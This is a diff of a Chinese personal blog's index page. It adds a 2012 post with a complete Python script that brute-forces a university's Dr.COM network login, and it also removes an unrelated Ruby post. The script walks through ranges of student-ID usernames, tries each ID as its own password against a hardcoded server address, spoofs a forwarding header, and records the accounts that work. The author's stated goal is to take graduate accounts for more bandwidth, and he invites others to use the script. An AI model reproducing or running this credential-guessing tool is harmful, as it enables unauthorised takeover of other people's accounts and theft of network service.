@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。 不过在用的时候发现查看带有中文字符的文件会出现乱码，在这里得到了解决方案： 打开putty主程序， &hellip;">
+	<meta name="description" content="嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是， &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -76,6 +76,237 @@
 		
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2012/04/04/crack-drcom-account-in-python/">
+		
+			Python猜研究生账号</a>
+	</h2>
+	<div class="entry-content">
+		<p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#! /usr/bin python
+</span><span class='line'># encoding: utf-8
+</span><span class='line'>
+</span><span class='line'>import urllib2
+</span><span class='line'>import urllib
+</span><span class='line'>import sys
+</span><span class='line'>import types
+</span><span class='line'>
+</span><span class='line'>guess_list = []
+</span><span class='line'>server_url = "http://222.174.155.19/"
+</span><span class='line'>headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
+</span><span class='line'>'X-Forwarded-For':'1.1.1.1'}
+</span><span class='line'>
+</span><span class='line'>def usage():
+</span><span class='line'>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+</span><span class='line'>print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
+</span><span class='line'>
+</span><span class='line'>def Login(username, password):
+</span><span class='line'>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+</span><span class='line'>request = urllib2.Request(url = server_url, data = params, headers = headers)
+</span><span class='line'>try:
+</span><span class='line'>output = urllib2.urlopen(request, timeout = 3).readlines()
+</span><span class='line'>Log(output[5], username, password)
+</span><span class='line'>except:
+</span><span class='line'>print "timeout!"
+</span><span class='line'>global guess_list
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>guess_list.append(username)
+</span><span class='line'>
+</span><span class='line'>def Logout():
+</span><span class='line'>output = urllib2.urlopen(server_url + "F.htm")
+</span><span class='line'>
+</span><span class='line'>def Log(output,username, password):
+</span><span class='line'># "msga='error1'" => can not login in web
+</span><span class='line'>result = output.find("msga='error1'")
+</span><span class='line'>if result != -1:
+</span><span class='line'>print "find one!!!"
+</span><span class='line'>f = open("./content.dat", 'a')
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>f.close()
+</span><span class='line'>else:
+</span><span class='line'>print "pass!"
+</span><span class='line'>f = open("./bad.dat",'a')
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>f.close()
+</span><span class='line'>#drop first element
+</span><span class='line'>global guess_list
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>
+</span><span class='line'>def show_result():
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>print "Have Guessed:"
+</span><span class='line'>for i in open("./content.dat").readlines():
+</span><span class='line'>print i,
+</span><span class='line'>print "some accounts can not guessed are in bad.dat"
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>
+</span><span class='line'>def get_timeout_list(timeout_file_path):
+</span><span class='line'>f = open(timeout_file_path)
+</span><span class='line'>global guess_list 
+</span><span class='line'>guess_list = f.readlines()
+</span><span class='line'>f.close()
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) == 2:
+</span><span class='line'># itself and only one argv,the path of account list file...
+</span><span class='line'>get_timeout_list(sys.argv[1])
+</span><span class='line'>elif(len(sys.argv) &lt; 2):
+</span><span class='line'>usage()
+</span><span class='line'>else:
+</span><span class='line'>#start and end account,argv[1] and argv[2]
+</span><span class='line'>start = int(sys.argv[1])
+</span><span class='line'>end = int(sys.argv[2])
+</span><span class='line'>if start > end:
+</span><span class='line'>usage()
+</span><span class='line'>exit(-1)
+</span><span class='line'>else:
+</span><span class='line'>guess_list = range(start, end + 1)
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
+</span><span class='line'>
+</span><span class='line'>while True:
+</span><span class='line'>for i in guess_list:
+</span><span class='line'>#drop last \n or \r
+</span><span class='line'>if type(i) == types.StringType:
+</span><span class='line'>i = i.rstrip('\n\r')
+</span><span class='line'>Logout()
+</span><span class='line'>print "Guess: " + str(i)
+</span><span class='line'>Login(i, i)
+</span><span class='line'>
+</span><span class='line'>if len(guess_list) == 0:
+</span><span class='line'>break
+</span><span class='line'>show_result()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
+
+<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true"></time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/python/'>python</a>
+
+
+</div>
+	
+</div>
+</article>
 
 
     <article class="post">
@@ -709,51 +940,6 @@
 
 
 	<a class='category' href='/blog/categories/vps/'>vps</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2012/02/06/wired-grammar-in-ruby/">
-		
-			奇怪的Ruby语法</a>
-	</h2>
-	<div class="entry-content">
-		<p>今天断断续续把昨天提到的那个Ruby编程入门看完了，原本打算按照教程中的例子做一遍，不过看得时候感觉这样做的话有些浪费时间，对于有一定编程经验的人来说按照例子做一遍没多大意义，很多内容看看就过了。</p>
-
-<p>但很可惜，在Ruby这里，看看还不一定就能理解，要不然今天也不会单独写一篇日志了，真得有不少特性和其他编程语言不一样，概念上倒是还能理解，语法符号上就要重新接受了，想等过两天买的Ruby编程书来到后细细重头看。</p>
-
-<p>还有20天了，真不知道当初设想的几个小理念能够实现多少，但也别失望，我还成功转型了呢，这个寒假收获将会颇丰！</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-02-06T22:19:00+08:00" pubdate data-updated="true"></time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/ruby/'>ruby</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
